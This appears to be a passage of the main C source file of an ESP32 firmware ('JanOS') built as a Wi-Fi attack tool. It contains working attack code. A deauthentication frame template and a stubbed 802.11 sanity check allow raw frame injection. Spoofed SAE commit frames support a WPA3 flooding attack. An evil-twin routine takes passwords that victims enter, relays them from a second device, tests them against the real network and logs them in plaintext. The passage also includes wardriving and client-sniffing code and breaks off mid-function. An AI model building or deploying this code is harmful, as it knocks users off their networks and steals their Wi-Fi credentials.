// main.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>
#include <errno.h>
#include <sys/stat.h>
#include <unistd.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_system.h"
#include "esp_log.h"
#include "esp_err.h"

#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_event.h"

#include "esp_now.h"
#include "esp_mac.h"

#include "esp_console.h"
#include "argtable3/argtable3.h"

#include "driver/uart.h"
#include "driver/sdmmc_host.h"
#include "driver/sdspi_host.h"
#include "driver/spi_master.h"
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"

#include "driver/gpio.h"

#include "led_strip.h"

#include "esp_random.h"
#include "mbedtls/ecp.h"
#include "mbedtls/bignum.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "esp_timer.h"

//Version number
#define JANOS_VERSION "0.0.4"

#define NEOPIXEL_GPIO      27
#define LED_COUNT          1
#define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz

// GPS UART pins (Marauder compatible)
#define GPS_UART_NUM       UART_NUM_1
#define GPS_TX_PIN         13
#define GPS_RX_PIN         14
#define GPS_BUF_SIZE       1024

// SD Card SPI pins (Marauder compatible)
#define SD_MISO_PIN        2
#define SD_MOSI_PIN        7  
#define SD_CLK_PIN         6
#define SD_CS_PIN          10

#define MY_LOG_INFO(tag, fmt, ...) printf("" fmt "\n", ##__VA_ARGS__)

#define MAX_AP_CNT 64
#define MAX_CLIENTS_PER_AP 50
#define MAX_SNIFFER_APS 100
#define MAX_PROBE_REQUESTS 200

static const char *TAG = "projectZero";

// Probe request data structure
typedef struct {
    uint8_t mac[6];
    char ssid[33];
    int rssi;
    uint32_t last_seen;
} probe_request_t;

// Target BSSID structure for channel monitoring
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t last_seen;
    bool active;
} target_bssid_t;

// Sniffer data structures
typedef struct {
    uint8_t mac[6];
    int rssi;
    uint32_t last_seen;
} sniffer_client_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    wifi_auth_mode_t authmode;
    int rssi;
    sniffer_client_t clients[MAX_CLIENTS_PER_AP];
    int client_count;
    uint32_t last_seen;
} sniffer_ap_t;

// GPS data structure
typedef struct {
    float latitude;
    float longitude;
    float altitude;
    float accuracy;
    bool valid;
} gps_data_t;

// Wardrive state
static bool wardrive_active = false;
static int wardrive_file_counter = 1;
static gps_data_t current_gps = {0};

// Global stop flag for all operations
static volatile bool operation_stop_requested = false;

// Sniffer state
static sniffer_ap_t sniffer_aps[MAX_SNIFFER_APS];
static int sniffer_ap_count = 0;
static volatile bool sniffer_active = false;
static volatile bool sniffer_scan_phase = false;
static int sniff_debug = 0; // Debug flag for detailed packet logging

// Probe request storage
static probe_request_t probe_requests[MAX_PROBE_REQUESTS];
static int probe_request_count = 0;

// Channel hopping for sniffer (like Marauder dual-band)
static int sniffer_current_channel = 1;
static int sniffer_channel_index = 0;
static int64_t sniffer_last_channel_hop = 0;
static const int sniffer_channel_hop_delay_ms = 250; // 250ms per channel like Marauder
static TaskHandle_t sniffer_channel_task_handle = NULL;

// Deauth/Evil Twin attack task
static TaskHandle_t deauth_attack_task_handle = NULL;
static volatile bool deauth_attack_active = false;

// Target BSSID monitoring
#define MAX_TARGET_BSSIDS 10
static target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
static int target_bssid_count = 0;
static uint32_t last_channel_check_time = 0;
static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 3 * 60 * 1000; // 3 minutes

// SAE Overflow attack task
static TaskHandle_t sae_attack_task_handle = NULL;
static volatile bool sae_attack_active = false;

// Wardrive task
static TaskHandle_t wardrive_task_handle = NULL;

// Dual-band channel list (2.4GHz + 5GHz like Marauder)
static const int dual_band_channels[] = {
    // 2.4GHz channels
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    // 5GHz channels
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);

// Promiscuous filter (like Marauder)
static const wifi_promiscuous_filter_t sniffer_filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Wardrive buffers (static to avoid stack overflow)
static char wardrive_gps_buffer[GPS_BUF_SIZE];
static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];

//Target (ESP32) MAC of the other device (ESP32):
uint8_t esp32_mac[] = {0xCC, 0x8D, 0xA2, 0xEC, 0xEF, 0x38};


/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}


enum ApplicationState {
    DEAUTH,
    DEAUTH_EVIL_TWIN,
    EVIL_TWIN_PASS_CHECK,
    IDLE,
    DRAGON_DRAIN,
    SAE_OVERFLOW
};

volatile enum ApplicationState applicationState = IDLE;

static wifi_ap_record_t g_scan_results[MAX_AP_CNT];
static uint16_t g_scan_count = 0;
static volatile bool g_scan_in_progress = false;
static volatile bool g_scan_done = false;

static int g_selected_indices[MAX_AP_CNT];
static int g_selected_count = 0;

char * evilTwinSSID = NULL;
char * evilTwinPassword = NULL;
int connectAttemptCount = 0;
led_strip_handle_t strip;


// Methods forward declarations
static int cmd_scan_networks(int argc, char **argv);
static int cmd_show_scan_results(int argc, char **argv);
static int cmd_select_networks(int argc, char **argv);
static int cmd_start_evil_twin(int argc, char **argv);
static int cmd_start_wardrive(int argc, char **argv);
static int cmd_start_sniffer(int argc, char **argv);
static int cmd_show_sniffer_results(int argc, char **argv);
static int cmd_show_probes(int argc, char **argv);
static int cmd_sniffer_debug(int argc, char **argv);
static int cmd_stop(int argc, char **argv);
static int cmd_reboot(int argc, char **argv);
static esp_err_t start_background_scan(void);
static void print_scan_results(void);
static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
// Target BSSID management functions
static void save_target_bssids(void);
static esp_err_t quick_channel_scan(void);
static bool check_channel_changes(void);
static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count);
// Attack task forward declarations
static void deauth_attack_task(void *pvParameters);
static void sae_attack_task(void *pvParameters);
// Sniffer functions
static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void sniffer_process_scan_results(void);
static void sniffer_channel_hop(void);
static void sniffer_channel_task(void *pvParameters);
static bool is_multicast_mac(const uint8_t *mac);
static bool is_broadcast_bssid(const uint8_t *bssid);
static bool is_own_device_mac(const uint8_t *mac);
static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi);
// Wardrive functions
static esp_err_t init_gps_uart(void);
static esp_err_t init_sd_card(void);
static bool parse_gps_nmea(const char* nmea_sentence);
static void get_timestamp_string(char* buffer, size_t size);
static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
static bool wait_for_gps_fix(int timeout_seconds);
static int find_next_wardrive_file_number(void);
// SAE WPA3 attack methods forward declarations:
//add methods declarations below:
static void inject_sae_commit_frame();
static void prepareAttack(const wifi_ap_record_t ap_record);
static void update_spoofed_src_random(void);
static int crypto_init(void);
static int trng_random_callback(void *ctx, unsigned char *output, size_t len);
void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type);
static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt);

//add variables declarations below:
//SAE properties:
static int frame_count = 0;
static int64_t start_time = 0;

#define NUM_CLIENTS 20


/* --- mbedTLS Crypto --- */
static mbedtls_ecp_group ecc_group;      // grupa ECC (secp256r1)
static mbedtls_ecp_point ecc_element;      // bieżący element (punkt ECC)
static mbedtls_mpi ecc_scalar;             // bieżący skalar
static mbedtls_ctr_drbg_context ctr_drbg; 
static mbedtls_entropy_context entropy;

/* Router BSSID */
static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};

char * anti_clogging_token = NULL; // Anti-Clogging Token, if any
int actLength = 0; // Length of the Anti-Clogging Token

/* Spoofing base address. Each frame modifies last byte of the address to create a unique source address.*/
static const uint8_t base_srcaddr[6] = { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 };

static uint8_t spoofed_src[6];  // really spoofed source address
static int next_src = 0;        // spoofing index


static const uint8_t auth_req_sae_commit_header[] = {
    0xb0, 0x00, 0x00, 0x00,                   // Frame Control & Duration
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 1 (BSSID – placeholder)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // Address 2 (Source – placeholder)
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 3 (BSSID – placeholder)
    0x00, 0x00,                               // Sequence Control
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00  // SAE Commit fixed part
};

#define AUTH_REQ_SAE_COMMIT_HEADER_SIZE (sizeof(auth_req_sae_commit_header))


int framesPerSecond = 0;

// END of SAE properties








static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data);

static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len);
static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status);

static esp_err_t wifi_init_ap_sta(void);
static esp_err_t espnow_init(void);
static void register_commands(void);

// --- Wi-Fi event handler ---
static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_STA_CONNECTED: {
            const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
            ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                     (const char*)e->ssid, e->channel,
                     e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
            MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_SCAN_DONE: {
            const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
            MY_LOG_INFO(TAG, "WiFi scan completed. Found %u networks, status: %" PRIu32, e->number, e->status);
            
            if (e->status == 0) { // Success
                g_scan_count = MAX_AP_CNT;
                esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results);
                MY_LOG_INFO(TAG, "Retrieved %u network records", g_scan_count);
                
                // Automatically display scan results after completion
                if (g_scan_count > 0 && !sniffer_active) {
                    print_scan_results();
                }
            } else {
                MY_LOG_INFO(TAG, "Scan failed with status: %" PRIu32, e->status);
                g_scan_count = 0;
            }
            
            g_scan_done = true;
            g_scan_in_progress = false;
            
            // Only reset applicationState to IDLE if not in active attack mode
            if (applicationState != DEAUTH && applicationState != DEAUTH_EVIL_TWIN && applicationState != EVIL_TWIN_PASS_CHECK) {
                applicationState = IDLE;
            }
            
            // Handle sniffer transition from scan to promiscuous mode
            if (sniffer_active && sniffer_scan_phase) {
                sniffer_process_scan_results();
                sniffer_scan_phase = false;
                
                // Set promiscuous filter (like Marauder)
                esp_wifi_set_promiscuous_filter(&sniffer_filter);
                
                // Enable promiscuous mode
                esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
                esp_wifi_set_promiscuous(true);
                
                // Initialize dual-band channel hopping
                sniffer_channel_index = 0;
                sniffer_current_channel = dual_band_channels[sniffer_channel_index];
                sniffer_last_channel_hop = esp_timer_get_time() / 1000;
                esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
                
                // Start channel hopping task for time-based hopping
                if (sniffer_channel_task_handle == NULL) {
                    xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
                    MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
                }
                
                // Change LED to green for active sniffing
                esp_err_t led_err = led_strip_set_pixel(strip, 0, 0, 255, 0); // Green
                if (led_err == ESP_OK) {
                    led_strip_refresh(strip);
                }
                
                MY_LOG_INFO(TAG, "Sniffer: Scan complete, now monitoring client traffic with dual-band channel hopping (2.4GHz + 5GHz)...");
            } else {
                // Clear LED when normal scan is complete (ignore errors if LED is in invalid state)
                esp_err_t led_err = led_strip_clear(strip);
                if (led_err == ESP_OK) {
                    led_strip_refresh(strip);
                }
            }
            break;
        }
        case WIFI_EVENT_STA_DISCONNECTED: {
            const wifi_event_sta_disconnected_t *e = (const wifi_event_sta_disconnected_t *)event_data;
            ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                     (const char*)e->ssid, (int)e->reason);
            if (applicationState == EVIL_TWIN_PASS_CHECK) {
                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                if (connectAttemptCount >= 3) {
                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                    applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
                } else {
                    ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                    connectAttemptCount++;
                    esp_wifi_connect();
                }
            } else {
                ESP_LOGW(TAG, "Set app state to IDLE");
                applicationState = IDLE;
            }
            break;
        }
        default:
            break;
        }
    }
}

// --- ESP-NOW callbacks ---
static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len) {
    char msg[len + 1];
    memcpy(msg, data, len);
    msg[len] = '\0';

    evilTwinPassword = malloc(len + 1);
    if (evilTwinPassword != NULL) {
        strcpy(evilTwinPassword, msg);
    } else {
        ESP_LOGW(TAG,"Malloc error 4 password");
    }

    MY_LOG_INFO(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
             recv_info->src_addr[0], recv_info->src_addr[1], recv_info->src_addr[2],
             recv_info->src_addr[3], recv_info->src_addr[4], recv_info->src_addr[5]);
    MY_LOG_INFO(TAG, "Message: %s", msg);

    //Now, let's check if it's a password for Evil Twin:
    applicationState = EVIL_TWIN_PASS_CHECK;

    //set up STA properties and try to connect to a network:
    wifi_config_t sta_config = { 0 };  
    strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
    strncpy((char *)sta_config.sta.password, msg, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    vTaskDelay(pdMS_TO_TICKS(2000));
    MY_LOG_INFO(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
    connectAttemptCount = 0;
    MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
    esp_wifi_connect();
}

static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
    const uint8_t *mac_addr = send_info->des_addr;
    MY_LOG_INFO(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5],
             status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");
}

// --- Wi-Fi initialization (STA, no connection yet) ---
static esp_err_t wifi_init_ap_sta(void) {
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();
    

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    wifi_config_t wifi_config = { 0 };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));

    wifi_config_t mgmt_wifi_config = {
            .ap = {
                .ssid = "",
                .ssid_len = 0,
                .ssid_hidden = 1,
                .password = "nevermind",
                .max_connection = 0,
                .authmode = WIFI_AUTH_WPA2_PSK
            },
        };

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &mgmt_wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t mac[6];
    esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);

    if (ret == ESP_OK) {
        MY_LOG_INFO(TAG,"JanOS version: " JANOS_VERSION);
        MY_LOG_INFO("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        ESP_LOGE("MAC", "Failed to get MAC address");
    }

    return ESP_OK;
}

// --- Initialize ESP-NOW ---
static esp_err_t espnow_init(void) {
    
    ESP_ERROR_CHECK(esp_now_init());
    ESP_ERROR_CHECK(esp_now_register_recv_cb(espnow_recv_cb));
    ESP_ERROR_CHECK(esp_now_register_send_cb(espnow_send_cb));


    esp_now_peer_info_t peer = {
        .peer_addr = {0},
        .channel = 1,
        .encrypt = false,
    };
    memcpy(peer.peer_addr, esp32_mac, 6);
    if (esp_now_add_peer(&peer) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to add peer");
    }
    return ESP_OK;
    MY_LOG_INFO(TAG, "Peer added");
}

// --- Start background scan ---
static esp_err_t start_background_scan(void) {
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan already in progress");
        return ESP_ERR_INVALID_STATE;
    }
    
    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
    };
    
    g_scan_in_progress = true;
    g_scan_done = false;
    g_scan_count = 0;
    
    MY_LOG_INFO(TAG, "Starting background WiFi scan...");
    esp_err_t ret = esp_wifi_scan_start(&scan_cfg, false); // nieblokujace
    
    if (ret != ESP_OK) {
        g_scan_in_progress = false;
        MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(ret));
        return ret;
    }
    
    return ESP_OK;
}

// Save target BSSIDs for channel monitoring
static void save_target_bssids(void) {
    target_bssid_count = 0;
    
    for (int i = 0; i < g_selected_count && target_bssid_count < MAX_TARGET_BSSIDS; ++i) {
        int idx = g_selected_indices[i];
        wifi_ap_record_t *ap = &g_scan_results[idx];
        
        target_bssids[target_bssid_count].channel = ap->primary;
        target_bssids[target_bssid_count].last_seen = esp_timer_get_time() / 1000;
        target_bssids[target_bssid_count].active = true;
        
        // Copy BSSID
        memcpy(target_bssids[target_bssid_count].bssid, ap->bssid, 6);
        
        // Copy SSID
        strncpy(target_bssids[target_bssid_count].ssid, (const char*)ap->ssid, 32);
        target_bssids[target_bssid_count].ssid[32] = '\0';
        
        target_bssid_count++;
    }
    
    MY_LOG_INFO(TAG, "Saved %d target BSSIDs for channel monitoring", target_bssid_count);
    
    // Debug: Print saved target BSSIDs
    for (int i = 0; i < target_bssid_count; ++i) {
        MY_LOG_INFO(TAG, "Target BSSID[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
                   i, target_bssids[i].ssid,
                   target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                   target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5],
                   target_bssids[i].channel);
    }
}

// Static buffer for quick scan to avoid stack overflow (smaller buffer for channel monitoring)
#define QUICK_SCAN_MAX_APS 32
static wifi_ap_record_t quick_scan_results[QUICK_SCAN_MAX_APS];

// Quick channel scan for target BSSIDs
static esp_err_t quick_channel_scan(void) {
    MY_LOG_INFO(TAG, "Starting quick channel scan for target BSSIDs...");
    
    // Use the main scanning function instead of quick scan
    esp_err_t err = start_background_scan();
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Quick scan failed: %s", esp_err_to_name(err));
        return err;
    }
    
    // Wait for scan to complete
    int timeout = 0;
    while (g_scan_in_progress && timeout < 200) { // 20 seconds timeout
        vTaskDelay(pdMS_TO_TICKS(100));
        timeout++;
    }
    
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Quick scan timeout");
        return ESP_ERR_TIMEOUT;
    }
    
    if (!g_scan_done || g_scan_count == 0) {
        MY_LOG_INFO(TAG, "No scan results available");
        return ESP_ERR_NOT_FOUND;
    }
    
    MY_LOG_INFO(TAG, "Successfully retrieved %d scan records", g_scan_count);
    
    // Copy scan results to our buffer
    uint16_t copy_count = (g_scan_count < QUICK_SCAN_MAX_APS) ? g_scan_count : QUICK_SCAN_MAX_APS;
    memcpy(quick_scan_results, g_scan_results, copy_count * sizeof(wifi_ap_record_t));
    
    // Update target channels based on scan results
    update_target_channels(quick_scan_results, copy_count);
    
    MY_LOG_INFO(TAG, "Quick channel scan completed");
    return ESP_OK;
}

// Update target channels based on latest scan results
static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count) {
    bool channel_changed = false;
    
    MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
    
    // Log current g_selected_indices and their corresponding BSSIDs
    MY_LOG_INFO(TAG, "Current g_selected_indices and BSSIDs:");
    for (int i = 0; i < g_selected_count; ++i) {
        int idx = g_selected_indices[i];
        MY_LOG_INFO(TAG, "  g_selected_indices[%d] = %d -> BSSID: %02X:%02X:%02X:%02X:%02X:%02X, SSID: %s", 
                   i, idx, g_scan_results[idx].bssid[0], g_scan_results[idx].bssid[1], g_scan_results[idx].bssid[2],
                   g_scan_results[idx].bssid[3], g_scan_results[idx].bssid[4], g_scan_results[idx].bssid[5],
                   g_scan_results[idx].ssid);
    }
    
    // Debug: Print all scan results
    for (int i = 0; i < scan_count; ++i) {
        MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
                   i, scan_results[i].ssid,
                   scan_results[i].bssid[0], scan_results[i].bssid[1], scan_results[i].bssid[2],
                   scan_results[i].bssid[3], scan_results[i].bssid[4], scan_results[i].bssid[5],
                   scan_results[i].primary);
    }
    
    for (int i = 0; i < target_bssid_count; ++i) {
        if (!target_bssids[i].active) continue;
        
        MY_LOG_INFO(TAG, "Checking target BSSID %s (current channel: %d)", 
                   target_bssids[i].ssid, target_bssids[i].channel);
        
        // Find matching BSSID in scan results
        bool found = false;
        for (int j = 0; j < scan_count; ++j) {
            if (memcmp(target_bssids[i].bssid, scan_results[j].bssid, 6) == 0) {
                uint8_t old_channel = target_bssids[i].channel;
                target_bssids[i].channel = scan_results[j].primary;
                target_bssids[i].last_seen = esp_timer_get_time() / 1000;
                found = true;
                
                MY_LOG_INFO(TAG, "FOUND: Target BSSID %s (%02X:%02X:%02X:%02X:%02X:%02X) found in scan results at index %d, channel: %d", 
                           target_bssids[i].ssid, target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                           target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], j, scan_results[j].primary);
                
                if (old_channel != target_bssids[i].channel) {
                    MY_LOG_INFO(TAG, "Channel change detected for %s: %d -> %d", 
                               target_bssids[i].ssid, old_channel, target_bssids[i].channel);
                    channel_changed = true;
                }
                break;
            }
        }
        
        if (!found) {
            MY_LOG_INFO(TAG, "Target BSSID %s not found in scan results", target_bssids[i].ssid);
        }
    }
    
    if (channel_changed) {
        MY_LOG_INFO(TAG, "Channel changes detected, will resume deauth on new channels");
        MY_LOG_INFO(TAG, "Note: Using target_bssids[] directly for deauth attack to avoid index confusion");
    }
}

// Check if it's time for channel check
static bool check_channel_changes(void) {
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
    
    if (current_time - last_channel_check_time >= CHANNEL_CHECK_INTERVAL_MS) {
        last_channel_check_time = current_time;
        return true;
    }
    
    return false;
}

static void escape_csv_field(const char* input, char* output, size_t output_size) {
    if (!input || !output || output_size < 2) return;
    
    size_t input_len = strlen(input);
    size_t out_pos = 0;
    
    for (size_t i = 0; i < input_len && out_pos < output_size - 2; i++) {
        if (input[i] == '"') {
            if (out_pos < output_size - 3) {
                output[out_pos++] = '"';
                output[out_pos++] = '"';
            }
        } else {
            output[out_pos++] = input[i];
        }
    }
    output[out_pos] = '\0';
}

const char* authmode_to_string(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2 Mixed";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2 Enterprise";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/WPA3 Mixed";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI";
        default:
            return "Unknown";
    }
}


static void print_network_csv(int index, const wifi_ap_record_t* ap) {
    char escaped_ssid[64];
    escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
    
    MY_LOG_INFO(TAG, "\"%d\",\"%s\",\"%02X:%02X:%02X:%02X:%02X:%02X\",\"%d\",\"%s\",\"%d\",\"%s\"",
                (index + 1),
                escaped_ssid,
                ap->bssid[0], ap->bssid[1], ap->bssid[2],
                ap->bssid[3], ap->bssid[4], ap->bssid[5],
                ap->primary,
                authmode_to_string(ap->authmode),
                ap->rssi,
                ap->primary <= 14 ? "2.4GHz" : "5GHz");
    vTaskDelay(pdMS_TO_TICKS(50));
}



static void print_scan_results(void) {
    //MY_LOG_INFO(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
    for (int i = 0; i < g_scan_count; ++i) {
        wifi_ap_record_t *ap = &g_scan_results[i];
        // MY_LOG_INFO(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
        //        i, ap->rssi, ap->authmode, ap->primary,
        //        ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //        ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //        (const char*)ap->ssid);
        // MY_LOG_INFO(TAG, "%-6d %-16s %02X:%02X:%02X:%02X:%02X:%02X   %-2d   %-4d   %s",
        //     (i+1),
        //     (const char*)ap->ssid,
        //     ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //     ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //     ap->primary,
        //     ap->rssi,
        //     ap->primary <= 14 ? "2.4GHz" : "5GHz");

        print_network_csv(i, ap);

    }
    MY_LOG_INFO(TAG, "Scan results printed.");
}

// --- CLI: commands ---
static int cmd_scan_networks(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    // Set LED (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_strip_set_pixel(strip, 0, 0, 255, 0);
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    }

    esp_err_t err = start_background_scan();
    
    if (err != ESP_OK) {
        // Clear LED (ignore errors if LED is in invalid state)
        led_err = led_strip_clear(strip);
        if (led_err == ESP_OK) {
            led_strip_refresh(strip);
        }
        
        if (err == ESP_ERR_INVALID_STATE) {
            MY_LOG_INFO(TAG, "Scan already in progress. Use 'show_scan_results' to see current results or 'stop' to cancel.");
        } else {
            ESP_LOGE(TAG, "Failed to start scan: %s", esp_err_to_name(err));
        }
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Background scan started. Wait approx 15s..");
    return 0;
}

static int cmd_show_scan_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan still in progress... Please wait.");
        return 0;
    }
    
    if (!g_scan_done) {
        MY_LOG_INFO(TAG, "No scan has been performed yet. Use 'scan_networks' first.");
        return 0;
    }
    
    if (g_scan_count == 0) {
        MY_LOG_INFO(TAG, "No networks found in last scan.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Showing results from last scan (%u networks found):", g_scan_count);
    print_scan_results();
    return 0;
}

static int cmd_select_networks(int argc, char **argv) {
    if (argc < 2) {
        ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
